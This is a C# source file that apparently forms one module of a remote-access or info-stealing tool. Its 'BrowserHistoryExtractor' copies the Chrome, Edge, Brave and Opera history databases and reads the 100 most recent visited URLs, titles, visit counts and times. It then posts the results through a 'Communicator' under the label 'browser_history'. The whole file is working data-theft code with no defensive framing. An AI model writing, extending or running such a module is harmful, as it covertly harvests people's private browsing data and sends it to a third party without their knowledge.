using System;
using System.Data.SQLite;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using True.Core;

namespace True.Features
{
    internal static class BrowserHistoryExtractor
    {
        private static readonly string LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private static readonly (string dbPath, string browser)[] Targets =
        {
            (@"Google\Chrome\User Data\Default\History", "Chrome"),
            (@"Microsoft\Edge\User Data\Default\History", "Edge"),
            (@"BraveSoftware\Brave-Browser\User Data\Default\History", "Brave"),
            (@"Opera Software\Opera Stable\History", "Opera")
        };

        public static async Task ExtractAsync()
        {
            StringBuilder result = new();

            foreach (var (relativePath, browser) in Targets)
            {
                try
                {
                    string fullPath = Path.Combine(LocalAppData, relativePath);
                    if (!File.Exists(fullPath))
                    {
                        Logger.Warn($"[BrowserHistory] {browser}: History DB not found.");
                        continue;
                    }

                    string tempPath = Path.GetTempFileName();
                    File.Copy(fullPath, tempPath, true);

                    using var conn = new SQLiteConnection($"Data Source={tempPath};Version=3;");
                    conn.Open();

                    using var cmd = new SQLiteCommand("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100", conn);
                    using var reader = cmd.ExecuteReader();

                    int count = 0;
                    while (reader.Read())
                    {
                        string url = reader.IsDBNull(0) ? "(no url)" : reader.GetString(0);
                        string title = reader.IsDBNull(1) ? "(no title)" : reader.GetString(1);
                        int visits = reader.IsDBNull(2) ? 0 : reader.GetInt32(2);
                        long rawTime = reader.IsDBNull(3) ? 0 : reader.GetInt64(3);
                        DateTime visitTime = ChromiumTimeToDateTime(rawTime);

                        result.AppendLine($"[{browser}] {title}\nURL: {url}\nVisits: {visits}\nTime: {visitTime}\n");
                        count++;
                    }

                    if (count == 0)
                        result.AppendLine($"[{browser}] No history found.");

                    conn.Close();
                    File.Delete(tempPath);
                }
                catch (Exception ex)
                {
                    Logger.Error($"[BrowserHistory] {browser} failed: {ex.Message}");
                }
            }

            if (result.Length == 0)
                result.Append("(no browser history)");

            await Communicator.PostResponse("browser_history", result.ToString().Trim());
        }

        private static DateTime ChromiumTimeToDateTime(long chromeTime)
        {
            return chromeTime == 0
                ? DateTime.MinValue
                : new DateTime(1601, 1, 1).AddTicks(chromeTime * 10);
        }
    }
}
